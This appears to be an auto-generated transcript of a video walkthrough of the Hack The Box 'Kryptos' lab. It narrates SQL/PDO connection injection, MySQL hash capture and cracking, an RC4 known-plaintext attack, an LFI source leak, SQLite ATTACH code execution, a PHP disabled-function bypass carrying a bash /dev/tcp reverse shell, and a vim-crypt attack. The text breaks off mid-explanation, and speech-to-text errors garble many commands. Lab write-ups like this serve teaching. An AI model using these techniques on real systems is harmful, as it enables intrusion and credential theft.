 what's going on YouTube this is hip sack and we're gonna attempt to do Kryptos from hack the box if you can't tell by the name this box is going to have a lot of cryptography which is probably the only subject I hate more than doing low-level binary exploitation crap however cryptography is a universally ADA subject which is good for us because a lot of the low-hanging fruit and vulnerabilities can be found by simply just knowing more than the developers or admins and those people stopped looking into crypto right after they copied code off of github and then it appeared to work in their project so you don't have to put that much time into learning crypto in order to identify potential vulnerabilities and if you ever do find a vulnerability and crypto you're just going to look like a wizard so with all that being said let's jump into the box as always we begin with it and map so - SC for default scripts as v8 versions oay up in all formats but in the end map director and call it crypto s-- and then the IP address which is 10-10-10 129 can take some time to run so I've already ran it looking at the results we see just two ports open the first one being SSH on port 22 and it's telling us that say Ubuntu server the next one being HTTP on port 80 it's running Apache and also telling us it's a Ubuntu server we also have a script running and it's telling us that the PHP SSID which stands for PHP session ID cookie is being sent when we request a page on slash so we know this server probably is running PHP the first thing I want to do is go in and take a look at it so we're just gonna go to 10 10 10 1:29 and go to burped on my intercept off so we can navigate to this page and we get a login username and password so I'm just gonna try the quick admin admin and then we can also try like guest guest and let's turn this to never save it just responds to note so before I go any further I want to do some recon because I always like having recon running in the background while I work so we'll just do go bustard dir for directory brute force - w wordless users shared der buster word lists the directory list two point three actually I'm going to change then do lowercase 2.3 small I'm doing that because I'm also doing the extension brute-force of PHP if we don't do it it just can take up a lot of memory and can take quite a while to run so just to speed things up I'll do this and then - you for URL HTTP 10 10 10 129 and then - Oh out file will say der bust lowercase port 80 and PHP for the extension just something so you kind of get an idea what this was that you ran so while that's running now we can go take a look and let's make sure this goes over to burp we can do username as please subscribe and the password as thank you going over to burp we can send to repeater with control or go to the tab with control shift our and begin looking at this which we see use him and password which we expect but we're getting two or three more parameters we don't expect the first one being DB and that's DB equals crypto so this probably stands for database and then we get token equals something and this looks like maybe a sha-1 some so let's do echo - n paste this WC - C 64 characters so I'm not exactly sure what hash that is but it's a hash definitely so if you do control U on this page to view the source we can see that token is being set on this input button so most likely this is a CSRF cross-site request forgery and essentially the purpose of that is to protect the submission button so in order to do a submit you have to go to the index dot PHP grab the token and then use that to submit so a third party website can't use javascript to just magically do it or it's more difficult to use javascript to magically do it and then it also makes it a pain for automated programs to do some type of fuzzing because every time they submit something they have to go back to the main page grab the token so if we click send we see we do get that new and now this token has been used so we get wrong too Okin so if we refresh this page we price your turn burps intercept off refresh the page we'll get a new token 33:54 and going into the repeater tab put this here and we can fuzzy each parameter one at a time to see what happens so I'm going to do please subscribe with the single quote we get nope so we'll move on we can do send again to see if we use that token and we did because we get wrong token so let's grab another token and go to the next parameter and if we do this and we don't see anything then I will be creating a program to automate some fuzzing but I have a feeling we'll be lucky so right now a single quote and password and we still get note so we can go back grab a new token by refreshing this page copy it go to burp paste and then we're database is put a single quote after crypt or and we get PDO exception code 1044 we can click send again and we still keep getting that and we can validate we need a good token by sending a good request we get nope send it again wrong token put that single quote back in and we still get wrong token so in order for this exploit to work we need a valid token so let us set this up send this and then we'll take a note of it so go to cherry tree I'm gonna name it crypt dose and then sub node and I'll just call this interesting and interesting is just where I put random notes so this will be slash login or just do slash this is DB parameter injectable sequel and requires valid CSRF token just so we go back and if we ever run into issues I can ormally go back to this page on cherry tree and read through because it's not unlike me to begin writing something exploit this and forget it CSRF and it just not to work so that's why I keep those little notes so now we get PDO exception code 1044 PDO is a PHP data object I believe and 1044 is some magical error code so I'm gonna go over to Firefox let's turn intercept off because I'm going to the Internet it was to PDO exception error list server client and maybe we'll get lucky and find the page possible PDO exception codes my sequel 5 here we go Eric ODEs turning at 1000 or server errors error codes turning at 2000 or client errors so that's handy to know and we can go here and let's see 10:44 type 1044 database access denied so access denied for user at database so apparently we can't log into the database crypt or so the other thing I want to do is do like PHP PDO connection and see what this looks like so we can go to the main page of this and see how it looks we create the object and then do my sequel : and then arguments so host equals localhost looks like semicolon is used to separate parameters and then a different parameter so we can probably change the database name because this is where we're injecting right at tests so if we put a semicolon here maybe we can rewrite this host variable and point it back to us so let's do semicolon host is equal to 1010 14.3 because that should be us we have go Buster has quite a few results but if config tun 0 yes I am 10 10 14 3 so NCLB NP 3 3 0 6 because that is the port that my sequel runs on so if we go here click send we're not getting anything back and over here we get a success or at least a connection so we can control see to kill that looking back at our burp we can see error code 2006 this is a client error so 2 0 0 6 server gone the my sequel server has gone away that's a funny error code name but let's use Metasploit now to intercept this hash so I'm just gonna do MSF console and actually we can do MSF DB run so it will start the database and then initialize the database and get in so I haven't ran Metasploit since I did rebuild so that's why it's creating all this little schema but Metasploit has a bunch of auxilary scripts which many people don't use one of the great ones is the credential gathering scripts so we'll see that we can gather like SMB hashes if we for someone to connect to us via SMB mice equals one of them so I'm going to search for maybe credentials and then go up to auxiliary let's see let's see auxiliary maybe gather I really hate having the larger font because it makes this window look weird maybe we can just search my sequel exploit windows there we go so we got this auxiliary server capture so this is FTP HTTP IMAP MS sequel my sequel so these are standing up services and then if a client authenticates their service it will respond and then give you the hash that they try to authenticate with so let's use auxiliary server capture my sequel show the options we got server host server port version whatnot so we'll set maybe just runs in all her ports yep if we just do run listen on 0 0 0 so that's all interfaces so now when I do this burp if we click send again we get a 1045 which I don't know what that error is but going back here we get a challenge and response so we have now successfully gathered this hash we could give it a John PW file and store this but I think we can just mainly do a hash cat file and create this I always like using hash cat over John just because of personal preference but let's see what error code that is so 1045 that is going to be a server error and that is access denied to maybe ok this is access denied without a password this is access denied with a password so we authenticated in and then Metasploit said nope you're not authenticated so let's go SSH kraken and then we'll do CD hash cat - cat - - example hashes bless example I thought was hashes I always get this wrong God slash cat there we go bless and we want my sequel let's see it's not doesn't look at that doesn't look like that it could be this this could be a challenge response and this could be the this could be the challenges could be the response so we'll try this format so let's copy this and see if this works and that number is 11 200 so V hashes slash kryptos dot my sequel and then we want to do MySQL and a and then go up here grab the challenge paste stir and then grab the response we have to grab this and hope this works I haven't actually tested this I think I use John why did the box initially have three f9d what f3 f9 d there we go so we can do my sequel - m 11 200 hashes cut hashes um yeah this is ashes dot slash hash cat I don't know why I had my sequel there 11200 and hashes crypto s-- user share word list I'm on my box so opt word list rock you and we'll run this through and see if it accepts it initializing come on and it looks like we have successfully cracked it so the password is going to be kryptonite so go back to the cherry tree database you uh we can go to creds let's do control-shift-n name the table creds there's going to be DB user and the password that's kryptonite and this password is my sequel so service username password is how I organized the and we can also do it all in Metasploit if we wanted to but I'm old-fashioned and rather do it and note files so we can exit that and the next thing we want to do is start allowing the service to connect to us so that really gave us nothing other than we could potentially go back to decrypt to a login page take that user password and try like admin kryptonite and all that stuff but I ignored that because the very first error code we got well nevermind forget I said I was gonna say the very first error code we got was an access denied but we got that access denied when we put the single quote in the database and that's because it was an access denied because we couldn't communicate to the database so ignore that whole rant let's just begin by creating a local database and having it send us information so the first thing I'm going to do is make sure it can talk to me so we'll do service my sequel status and it is stopped I do netstat a LNP grab 3306 we're good I'm just making sure my sequel is not running before I start - and normally I would do this and docker but because doing an andhaka would make this video probably another 20-30 minutes you should just look at the unintended video and look at how I used docker and we use my sequel in that video as well with docker specifically and the reason why I do that is just because if that service gets exploited while I'm doing this they're contained into the docker it creates another layer of protection so my sequel - you root and now we want to create database crypt or and then we will create user DB user identified by going over the cherry tree grab kryptonite put it here and now we want grant all privileges on crypt woodster to DB user at everyone I think % and my sequel is always a wild-card so that should be good we can flush privileges okay next thing I want to do netstat dash al NP grep 3 3:06 we can see we'll only listening on port on localhost 1 27001 so if we want to connect we get 2002 is the air and if we look at 2002 let's see what this says can't connect to my sequel server so we can't connect whatever one we do is Google so cat redirect TCP port we could change the configuration of my sequel to listen on all hosts but generally I just don't like changing a figuration of services because it's one layer of security so I'd rather do a so cat redirector because that way if I reboot a kill so cat the change that I made is gone so TCP listen let's see let's try where's it 10 1014 380 I think there's a host directed to one 27001 I don't think that's correct yeah TCP listen 80 I think its host is equal to 10 10 14 3 or maybe interface let's go back so cat bind interface sometimes there's too many commands and of course what I go and Google is the syntax I wanted so what this is doing is binding on the interface 10 10 14 three on port 3306 forking every connection so it's not going to keep the socket open but then forward it to localhost 127 0 0 1 3 3 0 6 so now if we go back up netstat a LNP grab 3 306 we can see we're both listening on 1010 14 3 & 1 2700 so now if I go back to Berk send this we authenticated so everything looks good here so the next step is to TCP dump so let's do Wireshark and additionally I normally wouldn't recommend just running wire shook because it has a bunch of exploits but in this case we should be fine so let's see oh we got go Buster still running that's why getting a bunch of stuff let's just kill go Buster or remember there's results but generally doing TCP dump and then using wireshark to open the TCP dump is much safer than just having Wireshark winner on it in my face ok so let's send this go here and we didn't get anything why did we not get it connecting to us host is equal to 10 10 14 3 Oh weird let's change this to B that is on tun 0 you should also be able to have to loop back I expected to see something on port 3306 we're not really getting anything cancel this I'll continue said let's do TCP port is equal to three three zero six we're not seeing a single thing on this TCP dump - I times 0 port 3306 three V's to be as verbose as possible let's see oh here's where I would have went to cherry tree so I interesting CSRF token well gain wrong token so I apparently demoed something created a valid request and then killed our token so always keep that in mind paste the new one click send we got new and we got a bunch of data so that's the issue so let's go to Wireshark done zero and let's go back to Firefox refresh the page grab the new token go to birth give it the token send the request awesome so we got a nope response but going here we do have my sequel traffic so if we do TCP port is equal to three 3:06 now we can actually see stuff if we right click follow TCP stream we can see more so we see the command starting select username password from users where username is please subscribe and password is this so this is probably the md5 sum of thank you just based upon what this looks like I think it's 32 characters echo dash n paste WC - see it is so what we can do is create this table so this is crypto users so let's go back to our my sequel command and we can do create table we have to do use database use database crypt or just use crypt or my bad so database changed so now we switch from none to crypt or and now we can create the table so that will be create table users and then the two columns the first one being user name and that's a string server care we'll give it 32 characters and then we also have password that's a md5 sum so that's also going to be 32 characters so I think that syntax is correct yeah it worked so now we want to insert into users values and then the firt user was please subscribe and the password is let's grab this paste this in okay so now that is a valid thing if we go back here grab a new see surf token copy it go to burp paste it in click send and let's see what we get it looks like maybe something maybe nothing 3:02 found so now our session is valid so let's go over to a web browser and just go here and we get redirected here and that worked because this repeater window had the same PHP session as was in our um web browser the session became authenticated and that login page now directed you here which is the file encrypt door so we got encrypt and decrypt so if we go to both pages decrypt is under construction but encrypt is where we are at so let me just close up these tabs to clean up and it looks like it we it wants us to give it a URL and there are two ciphers there's a s CBC and RC for well our c4 is probably gonna be infinitely weaker than a s CBC so that's the one I'm gonna try first I'm also going to try like file colon slash slash let's see passwd to see if we can read files and we get only HTTP scheme is supported so let us go we can probably get rid of my sequel that can probably stay open and let's see let's just do make to dub dub dub go in here V file actually let's give it a bunch of A's I always like encrypting a bunch of the same character so I do Python see print a times will do 9001 and this can be - we'll call the file a so we can delete that file and then a is 9001 A's so if we do Python simple HTTP server on port 80 and then have this gedit so 10 10 14 3 /a we get encrypted content which is a lot of base64 so let's copy this and we can probably just create a new pane make derp what was this called file encrypter yeah file and crypt or make a - to make it be easier and V encrypted a and we may want to name that to encrypt it a dot B 64 play 64 dash D and look at this and all I'm doing here is just taking a glance over this and seeing if like anything repeats or just sticks out doesn't look like it does but this is our c4 and it's vulnerable to known plaintext type of attacks so the best way to explain this is just to demo it I'm going to go to X or PW which is just on line X or thing and we'll I guess go to cherry tree to demonstrate this so we use this page as kind of a scratch pad and essentially what we have is plaintext ex-ored with a secret key and that equals the plum and on this page let's see the following crypt or we select our c4 and we give it a URL that gives it always what we're putting in is always here the secret key is unknown and we're getting the blob which is payload we'll say we can figure out what this is by X or in the plaintext with the payload and then we get this middle piece so let's set this all up so we'll do the plain text as please subscribe and a key is going to be patreon czar cool both of these are 15 characters long so it makes it a bit easier so let's go to X or calculator online paste both of them in I could type now would have created a unique arrow at the end of this and patreon czar cool and the main reason i was saying that if we just change this to a skate let's see what happens if I just do patreon and change this to a ski you get please and then something else so extra is a one-for-one so if both these 115 some characters wouldn't get X word so that's what I meant about there'd be interesting if I left that typo in so we have please subscribe x word with patreon Zora cool gives us this so this is a page this we actually don't know on the file encrypt or payload that's what we're solving for so what I did was I put always here so that's 1 2 3 4 5 we need a few more a z' and there we go and I'm going to XOR this with patreon so cool and we're gonna get something so but always XOR and we get this so this is essentially what I did but we don't know this and that's what we wanted to get so all we're going to do as XOR this with this and we'll get the unknown which can be used here which we don't know on the page to decrypt content and then build our own decrypt or for the page so let's do this real quick copy this paste this in change this to X and we can change this to ASCII and we see we're going to get this and of course we know if we XOR patreon czar cool with this we'd get please subscribe so we can show that real quick so now we're doing this which will be the blob the page gives us this will be the secret key which we got because we did all a's and then go to ASCII we get please subscribe so that's how is it going to work and this is going to work because rc4 is a stream site for the AES is CBC which is cipher block chaining let's just do CBC crypto go to images and CBC mode eliminates this type of attack because it uses something in the previous block as the key for the next so it's not perfect but it does eliminate the type of tax you see in a stream cipher because if the block was eight characters we'd only be able to decrypt the first eight and then the crypto routine would be different for the next eight then it wasn't the first and it would just break so let us now create a script that will make a request to this page that says rc4 and then grab this decrypt encrypted content blob and decrypt it for us because we could have this page go to HTTP colon slash slash one 27001 slash something and encrypt and that brought us to the index dot PHP crap no I did not want to do that regrets we had let's do what is it I still have so cat running so I should be able to do or is it please subscribe and thank you we have to do please subscribe thank you good a burp intercept is on turn intercept on here send and we have to change the host to be us ten ten fourteen three click forward okay so if we go here we can have it request pages on one 27001 and that's handy because if we had paid attention to go Buster output we see /dev aired out at 4:03 which is an authorization failure and there's no other like authorizations here so if we do slash dev here we get that output let's see HTTP slash dev with a trailing slash probably get more yeah so we get different things so we want to decrypt this output additionally we could potentially do like a PHP filter and decrypt the output of other things so if we do PHP colon slash slash was it filter convert base64 encode slash resource is equal to encrypt maybe only HTTP scheme is supported so we will hold that off but we won't be able to get the encrypted output of slash dev because maybe if we do this on localhost it's not 403 so let's go back into file encrypt door and we will make the crypt or - where to call it dot PI so let's start grading the script so the very first thing we need to do is import requests because we're making HTTP requests then we're going to need to take base64 input so from base64 import be 64 decode and then we'll probably have to grab the base64 output somewhere so we can do import regular expressions and then finally we wanted some type of user interface so we'll import the CMD module so the first thing to do is class terminal CMD and then we can override initialization to add a few things the first thing we want is self prompt is equal to this to give it something a little pretty and then we're going to add a to-do here and this would be a task for you to do and this is to grab the PHP session what we're gonna do is just hard code the cookie so we'll do cookies is equal to let's see go back here intercept is on refresh the page I guess we can go over to the history grab the latest and just grab this cookie so cookies is equal to this and this should be self dot cookies and then finally let's continue down what this terminal module would generally initialize with so the next thing we have to do is a web request so we're not gonna code that just yet we're just gonna have this print self dot cookies and we can also do print args to make sure this works and then terminal is equal to terminal and terminal dot CMD loop so we can do Python 3 decrypt or PI test and we got cookies and tests and this does not look correct self-doubt cookies and this is going to be PHP cess ID I don't know why I forgot to name the cookie but that's why we test it as we go so that should be good so we have to do two things now we're gonna have to decrypt the input and we have the output of 9001 a z' so we do go into file encrypter the output of 9001 a is that we did a few minutes ago is right here so we got to get the xor version of this so let's go up here and let's do Python 3 and from base64 import b64 decode and be 64 encode and we'll do actually let's do this in a new window so we can explain as we go I want more real estate go into here Python 3 ok this will work so we got everything imported so we'll have we have always ex-ored with we don't know and the output of that is encrypted a dot B 64 so we want to solve for this and we're going to name this cipher and we can name this key so first we have to create all the A's and we will name this plaintext so we're going to do plaintext is equal to a times 9001 and that just created what we used on the website to create this file and now we have to incur this and do it in code this no we OH so we got plaintext and now we got to get the key so the key is going to equal [Music] open encrypted a dot B 64 dot read e and c ry p te d i'm probably not in file crypt or there we go we got the key and we also probably want to do our strip because I noticed the key ended with a newline character here so let's remove that okay and going up just want to see the very beginning okay so the key right now is just a string variable now we'll be fine so we have to decode this so key is equal to be 64 decode key and now if we type the key it is a byte so we got this what we're going to do is solve for cipher which means we're going to take the plaintext XOR it with the key and we're going to get the cipher and that will allow us to decrypt the page so what we have to do is type on plaintext PT I thought we did PT a is equal to a times 9001 oh I don't do dollar language birth but if we do type PT it's a string so you have to convert PT to be a byte so we're doing two bytes it's always a mess when you do any conversions and you have mixed variable types Sookie is bytes PT a string so we'll just do PT is equal to bytes PT PT is equal to PT dot in code PT tight PT so now okay we got two bytes and key that is not basic ste forward good so what I'm going to do is say cipher is equal to bytes XY for X Y n zip PT key so all this is going to do is loop through these two variables PT and key and XOR them and then give it the name cipher so there we go we got cipher which is just a bunch of junk but if we do cipher is equal all we want to do it's like four equals we can just do these 64 encode cipher and then let's copy this and we'll put it in a file this is big okay we grabbed all that so now we can go into file encrypter and we'll put we'll call this cipher dot be 64 probably screwing up all this terminology which is making it more complicated than it needs to be but it's what we get for doing it live so now what we can do is since we have cipher we can take the unknown and this is going to be localhost / dev and XOR with cipher and we're going to get the plaintext so hopefully that makes sense if it doesn't maybe or make sense once we code it so decrypt we can do I'll just create a new module definition of decrypt and this will be I guess we'll call it cypher key is equal to open G dot B 64 dot R strip dot there's one more that we did they close all the windows oh it's here Python 3 or is it it's just our strip okay no I was forgetting read there we go okay now key is equal to base64 decode the key and now we need cipher so cipher is equal to be 64 decode cipher and now we can do plaintext is equal to bytes X Y for X Y and zip key cipher and we can return plaintext so now in our default module we can finally begin doing the HTTP request so params is equal to the dictionary the first thing is going to be think cipher it was we do a get request this is going to be cipher and URL so cipher is equal to rc for and URL is equal to eggs okay so our four request request get the URL 10 10 10 129 slash encrypt PHP that's the page we're going after cookies is equal to self cookies and params is equal to params okay so unknown text is equal to regular expression dot find all and we have to go to the response and I'm grabbing text area and grabbing everything between this so if we do this greater than then grab everything up until text area okay and then we have to specify what it's searching in and that's going to be the output of this request so our text and then grab the very first response so that would be zero so now we can decrypt it so decrypted is equal to decrypt unknown text and that's going to call this decrypt function that we just created and then we can print decrypted so we do Python three decrypted PI generator where did I screw that up there needs to be X word there we go so HTTP one 27001 slash dev slash no such file kita base64 it is now key dot B 64 let's try this again HTTP colon slash slash 127 0:01 / dev and that is not correct so we did something wrong can't encrypted a let's run through this again so V decrypter pi we're opening key dot base64 reading and our stripping that looks fine cipher that looks fine so I think all this is correct it's just probably what we have as key base64 so let's go back here let's go to key so key is equal to that base64 output we did read our strip so key is equal to base64 decode key from base64 import all that okay and now we need plaintext is equal to a times 9001 and then we got to do plain text equals plain text in code and that is now a byte stream okay and key is also a byte stream yep so let's do Seifer is equal to bytes X X or Y for X Y and zip and I did it think PT I'm going too fast and can't remember my stupid variables key PT okay sorry for that looks good to be 64 encode grab all this and we'll see if it's the same V key to be 64 paste md5 sum key they are different key to basics for over top of key to page 64 and we can try this script again http/1 27001 slash dev there we go so we probably just screwed up one of the variables before not sure exactly what happened but it's fixed so let's do decrypted dot decode UTF dash 8 and let's do a try around this and except print decrypted just in case we can't decode it it doesn't code the code to utf-8 107 0 0 1 slash dev there we go so now we have a way to navigate to dev and if we do index dot PHP we see that if we do index dot PHP view equals to do we can see the to-do list so remove SQL light underscore test underscore page.php remove word writable folder which was used for sequel light testing do the needful and done and also request access to slight restrict access to dev and oh what has been done is restricting access to slash dev and disabling dangerous PHP functions so it's probably got PHP safe mode installed and restricting access to dev is why we have used this service site request forgery type attack to access slash dev so that means sequel light underscore test to underscore page dot PHP exists so if we copy this we can go over into let's just turn intercept off which is we go dev slash o we can access dev da so let's go dev slash or is it SQL light test page PHP and we get nothing let's try dev slash to do dot PHP and we get just the output of this so what I just tested there was I took view and saying you know what this may just be like a PHP wraparound include so it may be grabbing this appending dot PHP and then displaying it so if we do dev index dot PHP question mark view equals this it'll be the same as going to dev like this probably I think when we did view to do it also gave us that header if I remember correctly whereas view to do yeah gave us the head and then outputted this here so what we could probably do is extract the source so view is equal to PHP filter convert base64 encode resource is equal to do is going to append PHP and it's operating at the dev directory so we'll see if this gives us base64 it does if we go here oops we can make the dev SRC the to do dot PHP b64 paste page 64 dash D and it's actually not a PHP script but if we do this with SQL Lite test database was that the page [Music] SQL Lite test page we get quite a bit more PHP base64 so we can do VI SQL Lite test dot PHP dot be 64 paste this in and then base64 - D to this and it did not like that one bit let's see let's try about this works echo - in base 64 - D this is about page so something about this SQLite test page is not working and what's going to suck is we probably should expand our plaintext so let's try this one last time grab this echo - n paste base64 - D cat SQL light dot B 64 what is going on here WD 7 I have no idea what went on there but it worked maybe I double base64-encoded or something so all I'm doing grab this output let's redo this VI SQLite dot b64 paste base64 - D yes do so now we have the source code so let's go over it line by line and see what we have the first thing we see is two parameters and their get parameter so a get request and that is no results and book ID and then we have query and says select star from books where I d equals them book ID there's no filtering in between these two so there's probably a sequel injection here so let's look at where query is used so the very first instance is it's just echoing out the query the second instance it's doing an exact call and it's doing the exact if we go up online that if no underscore results is set so and then the second query is if no results is not sent then it does a DB query so at this step I'd probably do a bunch of googling on sequel Lite to determine the difference between DB exec and DB query so let's just take some quick notes real quick so SQL Lite so params this is going to be no results and book ID there's two form query and then if no results then it will do a DB exact else it'll do a DB query so essentially that's the logic and DB exec will execute things so if we go to payload all the things we can look at potential sequel injections with this so let's go down to sequel injections sequel Lite injection because well that's what the script is called and we know it is and we have this one that is doing a remote command exec execution over SQL Lite command attached database so it's attaching to this database and it's writing this file we know that this directory right here is Ward writable so that's the file we want to attach to or the directory we want to attach in and then it's writing a PHP script that does system get CMD based upon the to do dot PHP we know PHP safe mode it's got blacklisted functions so system probably won't work we should try like echo or something safe so let's try that so let's copy this whole thing go to cherry tree we can paste that down and we want to change the directory so we want that d9 directory so let's just grab d9 it's equal light to take this out and go to cherry tree like that and then put this all on one line and also we don't want books DB and itself lol dot PHP let's just do what your test dot PHP and we don't want system instead we want echo and PHP works more often when it's formulated like that and we'll keep it simple won't pass an argument to it it'll just echo back please subscribe so if the output is just please subscribe we know it executed the script if the output is that bracket PHP echo please subscribe it did not execute the script so that looks good let's go back here go to a Python script and we want dev SQL Lite test page I think dot PHP if it doesn't exist yep so this is it and then question mark we need no underscore results we'll do one and book ID equals one semicolon attached and we get a 400 bad request and that's why because we have like three layers of get request working the very first layer is to this page or not this the file encryptor and that puts the URL in here so that's this request and then we're doing pretty much a third request with this injection so let's simplify this and just put this in burp and not go through the Python request module or just go through work so we can see exactly what's happening good or rc4 let's clear the queue of proxy or turn intercept on encrypt go here Center repeater and then we click go we get some contents if we want we can read this so we can go into file encrypter v we'll call their secret be 64 paste that and we can copy a cat Decrypter steal it equip function v manual dot PHP and we just need from base 64 m fort be 64 decode and then print decrypt so instead of cipher being an argument we will just put cipher as the file I think this was secret we called it so that'll probably work LS Python 3 manual dot PHP manual PI Python 3 function decrypt let's do like that execute it safer reference before assignment this is safer there we go so this is the error message we got so what's unusual in code all this and do it manually to try to help it out so highlight everything ctrl shift you until it's in just plain text format so let's do one full in code of the whole thing and then I'm gonna grab everything after this book ID equals one and because this probably contains a lot of bad characters I'm gonna convert selection URL and encode all characters and I'm missing that B so equals 1 you will convert URL all characters send and we can look at this output so if we go back here the secret pasted Python 3 so we see select star from books and it looks like it is doing it so if we went back into a Python script we can also test if slash dev is an open directory and if it's an open directory we should be able to see our script in here my dev this paste and let's see I do not see it which is not a good sign that it worked let's try and code it again there's no way that's it nopes don't see it control-shift you let's look at the source code is that no resort or no results because I put an s on the end of it get no underscore results and book ID so let's undo all this control shift Q twice n o underscore results one and a book ID equals one so everything looks fine we screwed up somewhere though well maybe we didn't who knows let's see we can turn proxy intercept off we don't need that now we called it test dot PHP I think repeater test dot PHP and let's see if the encrypter thinks this file exists far not found or empty so we definitely screwed on so let's see URL that all looks good if we delete this send we get contents not much contents what do we get three manual 1 equals get nothing probably because no results is used so it's doing exactly what we'd expect there and then we attach to the database test dot PHP let's just do test dot txt so make sure we can create a file so into value please subscribe so whenever I have issues with something I try to create make it one step simpler so now I removed a few bad characters by just making it a text file okay so let's do the URL encode and then another URL encode oops there we go rel encode all characters okay go to python test.txt and we created a file so what did we do differently so if we do like this PHP echo test okay let's do test two dot txt and show this so undo this paste we only want to do it here and then we did a full URL I need space full URL and good and you will encode on the hole parameter and then all characters up here will all characters send God stuff we go to test2 dot txt let exists with the PHP echo so let's see if we try PHP now all this work is there something that kills PHP files if we've done this twice we should be confident in our approach that we won't make a mistake ok test dot PHP so highlight everything control you highlight up to this percent convert everything click go that looks good and it was test dot PHP there we go so we have it executing code right here because if we looked at the previous ones now if we do test dot txt it's doing please subscribe so this is what we write in it and we actually wrote we go back to cherry tree this PHP echo test thing that's what we wrote and that's what it out put in so we definitely have code execution now in PHP scripts unfortunately for us the system functions probably disabled and that is because of the to do we look at to do dot PHP done restricted just dangerous PHP functions so there is a script called what is it I do have it an opt LS / opt no let's see github PHP dangerous function bypass begins with the CH let's see I'm gonna pause the video and look for the script so I have found the script I was looking for it's called Cheng crow we just searched chanc row github probably pronouncing that wrong we can just grab this so we can do get clone put in that directory and then we can look at the options at once so at once architecture which is a probably can be 64 bit then the input file name rev SH the output file name Chan PHP and then the path so this is just a bash script to execute if you're curious how it works it's got a little description up here but videos going on long enough so I'm tired this is going to be like that dev TCP 1010 14 3 9001 which is my IP and that should be good we should always test scripts after we write them so let's make sure I've got SH works it does so now we have to grab this - - output will call this sub PHP and then - - path ver dub dub dub HTML dev and this and we could also test if this path exists because if you remember one 27001 flash dev there was a local file inclusion in here so if we did view equals PHP filter convert base64 encode resource is equal and we do Rho W dub TM l dev and we can buy do to do and this will give us the base64 of to do PHP so that'll probably work there we go so we have validated that the full path of the server is that because if that path didn't exist you want to get base64 so that is correct the page doesn't have us doing a trailing slash on that so that would be fine okay we have created sub PHP so I'm copying that into htb boxes crypto s-- dub-dub-dub and now we can go back to this and we would create a different payload so instead of this we'll do upload dot PHP and we will call what we're going to do in the script is we're going to make a file put contents and this is going to open a file for write and we'll call this what we want to call it RC e dot PHP sure and then we will do file get contents HTTP 10 10 14 3 / sub dot PHP is what we called it and that put this all on one line so essentially this opens a file RCE PHP for writing and then goes and grabs a file on a web server and throws it in there so what we can do grab this and then we can we just go yeah actually let's on your link Oh didn't do it paste okay so encode everything and good this and why have that be highlighted cover its election URL all characters click go we see base64 so I'm assuming it worked and we had called this upload dot PHP so let's see this is upload dot PHP so it looks like it probably wrote it and we can confirm by going to a web server which we have on eighty and it's getting sub PHP so sub dot PHP is this file and we named it RC e dot PHP so if we do NCL BNP 9001 and we finally get our shell so if we do which python we got python here so python - c import PT y PT y dot spawn and bash background will control z st 2y roll - echo FG enter you won't see any input so now we have like tab autocomplete and things like that we can export term is equal to x term and now I should be able to clear the screen export term is equal to X term and I can clear the screen so here we go we're on the box so the next thing to do is enumerate the web directories just to make sure we didn't miss like a configuration file or something I've seen all those files go down one more directory and I believe go Buster had found all of these files as well so nothing interesting there I'm going to check out what is in slash home and looking at this we do have a home directory that has read execute missions open up to anyone so we can read the contents of this directory going in here we can see several files there is a dot ssh directory but the everyone permission bits is set to nothing so we can't go in there the only interesting files we can really read are creds old and creds dot txt so let's take a look at what creds dot all it is so if we can creds dot old we can see a username and password right away so let's copy this do it over the cherry tree go into creds we don't know what this goes to but we can paste it so let's go look at what creds dot text is and we see them crypto two and then a bunch of garbled data if you do file against that you can see that is indeed a them encrypted data and the first thing I want to do is figure out what algorithm this is encrypted with gender it's vim crypt option number two so let's go over to Firefox and just google them crypt probably Oh - so go - OH - and I'm gonna look at the first few things this one is a Python script that you should explore I haven't done anything with this but this will also try to like brute force keys and do other things it looks like just based upon reading it the next one this looks like just code snippet and then this is a pretty nice blog that's saying something interesting the title of this is it them blue flip them blue fish encryption or why you shouldn't roll your own crypto essentially this is talking about vim Crypt and bluefish which is using cfb cyber cipher feedback mode and them has implemented it with a static IV so it's vulnerable to the same attack we had just done against the URL decryption or whatever that service site request forgery get data decrypt set data so it's just a simple XOR as long as the encrypted text starts off like the plaintext and we can assume the first eight bytes of this file are probably gonna be the username because we are in his home directory and generally creds files begin with the username and then the password so let's go and try to decrypt this the first thing to do is get these files on to our Kali box so I'm just going to base 64 creds dot old and do the good ol copy and paste I'm doing in base64 just in case there's a character that doesn't translate well to ASCII to make sure I get a one-for-one copy so copying in boxes crypto s-- make them crimped and let us echo - n please 64 - d and this is creds dot text week at this that is indeed the file go back over here do the same exact thing actually that one was creds old I missed using like creds down encrypted or something but let's just fix that real quick guys got old and we can do creds txt let´s do echo - n to stay consistent base 64 - D creds text okay so we have these two files if we cat creds dot txt we have them crypto - cat creds old we have this the first thing we have to do is remove the header from this file so to remove the header we just need to know how big the header is and if you go down here the actual data begins right here so this is going to start at byte 10 11 12 13 14 15 16 17 18 19 and this isn't 20 because this is hex so this is 1a 1b 1c so if we go 0 X 1 C 2 decimal thing is 28 yep we get 28 bytes so let's use DD so DD input file is equal to creds text the block size is going to be 28 bytes skipping 1 so we're going to skip one block and then we're going to output to blob so if we xxd blob we get the file without the vim header so if we look at creds txt we started grabbing VND and then go back for periods and if we look right here this looks like it is going to be the same byte so we have done that successfully and if you're confused by that DD command we could also do block size is equal to 1 and skip 28 blocks and we'll get the same exact thing so doesn't matter how you do it but that is that and now the thing we have to do is a XOR of creds text and blob and we can't just take all of creds text but creds dot old and blob because we can't take all of this because this entire thing doesn't match the entire blob and the key probably isn't as long as this entire thing it may not be like a one-time pad whit's the keys they equal lengths chances are if we grab 8 bytes then we'll be able to get a good portion of data out of this so we only want to grab this and they're going to X or this against the first eight bytes of this magic and then we're going to multiply that by however long it is to X or against the whole phrase so if that doesn't make sense hopefully it will after we do it so let's see P dot dot slash file encryptor we'll do I think Manuel Pi is a good example looking into this let me read it sure we can work with this so the first thing I do get rid of everything and let me go into visual mode with capital V highlight everything and then a less than sign to uncomment it and now we have to do key is going to be the ciphertext and that file is called blob the next thing we have to do is get the plain text so plain text is equal to the first four bytes first eight bytes of the file instead of reading it I'm just going to type it Dae L that should be eight characters and then we want to enter this in utf-8 okay so the key is going to be ciphertext eight so if we execute this we'll see that the key is only going to display eight characters so we'll print the key I'll print ciphertext as well and execute utf-8 invalid stir plate plain text is equal to bytes and should be fine I thought see what line is this line three blob xxd blob VI manual let's see let's open this and that and we probably don't have to strip it there we go so we printed out the key first and that was just going to be the first eight bytes of the file and then we printed out the entire file so if we XOR the key with the plaintext and then multiply that by it looks like three 